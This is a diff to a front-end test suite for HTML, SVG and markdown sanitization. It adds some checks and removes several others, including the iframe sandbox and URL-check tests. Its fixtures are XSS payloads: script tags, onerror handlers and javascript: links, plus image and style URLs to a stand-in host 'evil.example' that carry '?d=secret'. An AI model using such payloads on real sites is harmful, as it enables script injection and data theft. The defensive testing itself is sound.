@@ -9,10 +9,10 @@ import path from 'node:path'
 import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest'
 import { Output } from '../../src/components/Outputs.tsx'
 import { ChatMarkdown } from '../../src/chat/markdown.tsx'
-import { isLocalUrl, purifyHtml, purifySvg, styleReachesOut } from '../../src/lib/sanitize.ts'
-import { inlineSvg, rootDecls } from '../../src/lib/svg.ts'
+import { purifyHtml } from '../../src/lib/sanitize.ts'
 import { dataOnly, withoutEmbedOptions } from '../../src/lib/vegaLoader.ts'
-import { mount, settle, unmountAll } from './mount.tsx'
+import { parseInline } from '../../src/report/inlineParse.ts'
+import { mount, unmountAll } from './mount.tsx'
 
 const SRC = path.resolve(__dirname, '../../src')
 const fetched: string[] = []
@@ -34,16 +34,6 @@ afterEach(() => {
 const html = (el: Element) => el.innerHTML
 
 describe('html output', () => {
-  test('html with script runs in a frame sandboxed to scripts alone, never inlined in the page', async () => {
-    const el = await mount(<Output bundle={{ 'text/html': '<p>probe</p><script>parent.__pwned = 1</script>' }} />)
-    await settle()
-    const frame = el.querySelector('iframe')
-    expect(frame).not.toBeNull()
-    expect(frame!.getAttribute('sandbox')).toBe('allow-scripts')
-    expect(el.querySelector('script')).toBeNull()
-    expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
-  })
-
   test('inlined html keeps its table and loses script, event handlers, style, forms and remote URLs', async () => {
     const markup = [
       '<table><thead><tr><th></th><th>n</th></tr></thead><tbody><tr><th>a</th><td>1</td></tr></tbody></table>',
@@ -54,7 +44,7 @@ describe('html output', () => {
       '<img id="leak" src="https://evil.example/leak.png?d=secret">',
       '<img id="srcset" src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/2x.png 2x">',
       '<div id="bg" style="background: url(https://evil.example/bg.png)">bg</div>',
-      '<div id="kept-style" style="color: red">kept</div>',
+      '<div id="kept-style" style="color: red" data-request="x">kept</div>',
       '<a id="js" href="javascript:window.__pwned = 2">j</a>',
       '<a id="ext" href="https://example.org/">ext</a>',
       '<svg><foreignObject><img src="x" onerror="window.__pwned = 3"></foreignObject></svg>',
@@ -65,23 +55,18 @@ describe('html output', () => {
     const out = html(el)
     expect(el.querySelector('table td')?.textContent).toBe('1')
     expect(out).not.toMatch(/onerror|<style|<link|<form|<button|<input|<iframe|javascript:|evil\.example/i)
-    expect(el.querySelector('#leak')?.getAttribute('src')).toBeNull()
-    expect(el.querySelector('#srcset')?.hasAttribute('srcset')).toBe(false)
-    expect(el.querySelector('#bg')?.getAttribute('style')).toBeNull()
-    expect(el.querySelector('#kept-style')?.getAttribute('style')).toBe('color: red')
-    expect(el.querySelector('#local')?.getAttribute('src')).toMatch(/^data:image\/png/)
-    const ext = el.querySelector('#ext')
+    // an output's ids are its own, prefixed so none is the app's
+    const byId = (id: string) => el.querySelector(`#user-content-${id}`)
+    expect(el.querySelector('#leak')).toBeNull()
+    expect(byId('leak')?.getAttribute('src')).toBeNull()
+    expect(byId('srcset')?.hasAttribute('srcset')).toBe(false)
+    expect(byId('bg')?.getAttribute('style')).toBeNull()
+    expect(byId('kept-style')?.getAttribute('style')).toBe('color: red')
+    expect(byId('kept-style')?.hasAttribute('data-request')).toBe(false)
+    expect(byId('local')?.getAttribute('src')).toMatch(/^data:image\/png/)
+    const ext = byId('ext')
     expect([ext?.getAttribute('target'), ext?.getAttribute('rel')]).toEqual(['_blank', 'noreferrer noopener'])
     expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
-  })
-
-  test('purifyHtml drops what would leave the page and keeps what stays on the machine', () => {
-    const origin = window.location.origin
-    const out = purifyHtml(`<img src="/api/ws/a/media/x.png"><img src="${origin}/api/x.png"><img src="//evil.example/x.png"><a href="#note" ping="https://evil.example/p">n</a>`)
-    expect(out).toContain('src="/api/ws/a/media/x.png"')
-    expect(out).toContain(`src="${origin}/api/x.png"`)
-    expect(out).not.toContain('evil.example')
-    expect(out).not.toContain('ping')
   })
 })
 
@@ -108,33 +93,27 @@ describe('svg output', () => {
     expect(images.filter(Boolean).map((h) => h.slice(0, 10))).toEqual(['data:image'])
     expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
   })
-
-  test("the figure's star rule moves onto its root as inline style, and nothing else of the sheet does", () => {
-    const fig = inlineSvg(svg, 'f1-')
-    expect(fig).not.toBeNull()
-    expect(fig!.markup).toMatch(/stroke-linejoin: round; stroke-linecap: butt/)
-    expect(fig!.markup).not.toMatch(/display: none/)
-    expect(rootDecls('*{stroke-linejoin: round; stroke-linecap: butt}')).toBe('stroke-linejoin: round; stroke-linecap: butt')
-    expect(rootDecls('* { position: fixed; stroke: url(https://e/x); fill: #fff } svg { stroke: red }')).toBe('fill: #fff')
-  })
-
-  test('purifySvg keeps SVG elements only', () => {
-    const out = purifySvg('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/><foreignObject><p>x</p></foreignObject><a href="https://evil.example/"><text>t</text></a></svg>')
-    expect(out).toContain('<circle')
-    expect(out).not.toMatch(/foreignObject|<p>|<a |evil\.example/)
-  })
 })
 
 describe('markdown', () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media/a.png)'
+  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media?path=a.png)'
 
   test('a markdown image from another host is drawn as its alt text, in an output and in the chat', async () => {
     for (const node of [<Output bundle={{ 'text/markdown': md }} />, <ChatMarkdown text={md} />]) {
       const el = await mount(node)
       const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
-      expect(srcs).toEqual(['/api/ws/w/media/a.png'])
+      expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
       expect(el.textContent).toContain('leak')
     }
+  })
+
+  test('markdown and sanitized HTML load no app route but the media routes', async () => {
+    const el = await mount(<ChatMarkdown text={'![x](/api/channel?cwd=/c&session=s) ![y](/api/ws/w/media?path=a.png)'} />)
+    const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
+    expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
+    const out = purifyHtml('<img src="/api/channel?cwd=/c"><img src="/api/ws/w/media?path=b.png"><div style="background:url(/api/channel)">d</div>')
+    expect(out).not.toContain('/api/channel')
+    expect(out).toContain('/api/ws/w/media?path=b.png')
   })
 
   test('raw html in chat markdown is shown as text, never parsed', async () => {
@@ -145,21 +124,6 @@ describe('markdown', () => {
 })
 
 describe('the pure checks', () => {
-  test('isLocalUrl: data: URLs, fragments and the page origin stay; any other host or scheme does not', () => {
-    const o = 'http://127.0.0.1:8300'
-    for (const u of ['data:image/png;base64,AA', '#clip', '/api/x', 'img/a.png', `${o}/api/x`, `blob:${o}/1234`]) expect(isLocalUrl(u, o), u).toBe(true)
-    for (const u of ['https://evil.example/a.png', '//evil.example/a.png', 'http://127.0.0.1:8301/a', 'javascript:alert(1)', '', '   ']) expect(isLocalUrl(u, o), u).toBe(false)
-  })
-
-  test('styleReachesOut: a url() to another host, image-set(), @import and expression() reach out', () => {
-    const o = 'http://127.0.0.1:8300'
-    expect(styleReachesOut('clip-path: url(#p1); fill: red', o)).toBe(false)
-    expect(styleReachesOut('background: url("https://evil.example/x")', o)).toBe(true)
-    expect(styleReachesOut("background: url('/api/x.png')", o)).toBe(false)
-    expect(styleReachesOut('background-image: image-set("x.png" 1x)', o)).toBe(true)
-    expect(styleReachesOut('@import "x.css"', o)).toBe(true)
-  })
-
   test("Vega's loader fetches no URL but a data: one, and a spec cannot hand it embed options of its own", async () => {
     const base = { options: {}, sanitize: async (uri: string) => ({ href: uri }) }
     const safe = dataOnly(base)
@@ -169,6 +133,15 @@ describe('the pure checks', () => {
     expect(withoutEmbedOptions({ mark: 'bar', usermeta: { embedOptions: { loader: {} }, note: 1 } })).toEqual({ mark: 'bar', usermeta: { note: 1 } })
     const plain = { mark: 'bar' }
     expect(withoutEmbedOptions(plain)).toBe(plain)
+  })
+
+  test("a report sentence's link keeps http:, https: and mailto: only; any other scheme stays text", () => {
+    const links = (t: string) => parseInline(t).filter((n) => n.kind === 'link')
+    for (const href of ['https://example.org/a', 'http://example.org/', 'mailto:someone@example.org']) expect(links(`see [x](${href})`), href).toEqual([{ kind: 'link', href, children: [{ kind: 'text', text: 'x' }] }])
+    for (const href of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,x', 'vbscript:x', 'file:///etc/passwd', '/api/x']) {
+      expect(links(`see [x](${href})`), href).toEqual([])
+      expect(parseInline(`see [x](${href})`), href).toEqual([{ kind: 'text', text: `see [x](${href})` }])
+    }
   })
 })
 
@@ -197,11 +170,5 @@ describe('the source', () => {
     expect(sinks).toEqual(['components/Outputs.tsx'])
     expect(readFileSync(path.join(SRC, 'components/Outputs.tsx'), 'utf8')).toMatch(/purifyHtml\(html\)/)
     expect(readFileSync(path.join(SRC, 'lib/svg.ts'), 'utf8')).toMatch(/purifySvg\(new XMLSerializer\(\)\.serializeToString\(svg\)\)/)
-  })
-
-  test('every react-markdown renderer draws images through MdImage', () => {
-    const users = sources().filter((f) => /from 'react-markdown'/.test(readFileSync(f, 'utf8')) && /<(?:ReactMarkdown|Markdown)\b/.test(readFileSync(f, 'utf8')))
-    expect(users.length).toBeGreaterThan(0)
-    for (const f of users) expect(readFileSync(f, 'utf8'), path.relative(SRC, f)).toMatch(/img: MdImage/)
   })
 })
